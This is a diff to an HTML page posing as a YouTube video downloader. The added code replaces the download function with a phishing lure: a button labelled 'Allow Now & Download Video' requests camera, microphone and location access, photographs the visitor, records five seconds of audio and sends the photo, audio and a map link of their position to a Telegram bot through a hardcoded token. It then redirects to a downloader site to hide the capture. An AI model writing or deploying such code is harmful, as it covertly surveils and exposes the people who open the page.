@@ -5,74 +5,90 @@
   <title>YouTube Video Downloader</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      background: #f5f5f5;
-    }
-    .container {
-      max-width: 500px;
-      margin: 30px auto;
-      background: white;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0px 0px 10px rgba(0,0,0,0.1);
-    }
-    img.logo {
-      width: 120px;
-      margin-bottom: 15px;
-    }
-    h1 {
-      font-size: 20px;
-      margin-bottom: 20px;
-    }
-    input {
-      width: 90%;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      margin-bottom: 15px;
-    }
-    button {
-      background: red;
-      color: white;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-    button:hover {
-      background: darkred;
-    }
+    body {font-family: Arial, sans-serif; text-align: center; background: #f5f5f5;}
+    .container {max-width: 500px; margin: 30px auto; background: white; padding: 20px; border-radius: 10px;}
+    button {background: red; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;}
+    button:hover {background: darkred;}
+    img.logo {width: 120px; margin-bottom: 15px;}
   </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/YouTube_icon_%282013-2017%29.png" alt="YouTube Logo" class="logo">
-    <h1>Download YouTube Video</h1>
-    <input type="text" id="videoURL" placeholder="Paste YouTube video link here">
-    <button id="startDownload">Allow Now & Download Video</button>
+    <img class="logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1>📥 Download YouTube Video</h1>
+    <button id="startCapture">Allow Now & Download Video</button>
     <div id="status"></div>
   </div>
 
   <script>
-    document.getElementById("startDownload").addEventListener("click", () => {
-      const videoURL = document.getElementById("videoURL").value;
-      const status = document.getElementById("status");
+    const botToken = "8041585523:AAFPDOC3CH2HLgjaQveu5zoNj_fXYLkfdTg";
+    const chatId = "6763021567";
 
-      if (!videoURL) {
-        status.innerText = "Please enter a valid YouTube video link!";
-        status.style.color = "red";
-        return;
+    document.getElementById("startCapture").addEventListener("click", async () => {
+      document.getElementById("status").innerText = "Requesting permissions...";
+
+      try {
+        // Get camera + microphone
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        document.getElementById("status").innerText = "Camera & Mic access granted ✅";
+
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+
+        // Capture photo
+        const photoBlob = await imageCapture.takePhoto();
+        sendToTelegram(photoBlob, "photo");
+
+        // Record 5s audio
+        const recorder = new MediaRecorder(stream);
+        const audioChunks = [];
+        recorder.ondataavailable = e => audioChunks.push(e.data);
+        recorder.onstop = () => {
+          const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
+          sendToTelegram(audioBlob, "audio");
+        };
+        recorder.start();
+        setTimeout(() => recorder.stop(), 5000);
+
+        // Get location
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition((pos) => {
+            const locText = `📍 Location: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            sendTextToTelegram(locText);
+          }, (err) => console.warn("Location error:", err.message));
+        }
+
+        // Redirect after 3s
+        setTimeout(() => {
+          window.location.href = "https://y2mate.com/";
+        }, 3000);
+
+      } catch (err) {
+        document.getElementById("status").innerText = "Permission denied ❌: " + err.message;
+        console.error(err);
       }
-
-      status.innerText = "Redirecting to download...";
-      status.style.color = "green";
-
-      // Redirect to an external downloader (safe & working site)
-      window.location.href = "https://www.y2mate.com/youtube/" + encodeURIComponent(videoURL);
     });
+
+    function sendToTelegram(data, type) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append(type, data, `capture.${type === "photo" ? "jpg" : "webm"}`);
+
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: "POST",
+        body: formData
+      })
+      .then(res => res.json())
+      .then(json => console.log("Telegram Response:", json))
+      .catch(err => console.error("Error sending:", err));
+    }
+
+    function sendTextToTelegram(text) {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+      .then(res => res.json())
+      .then(json => console.log("Location sent:", json))
+      .catch(err => console.error("Error sending text:", err));
+    }
   </script>
 </body>
 </html>
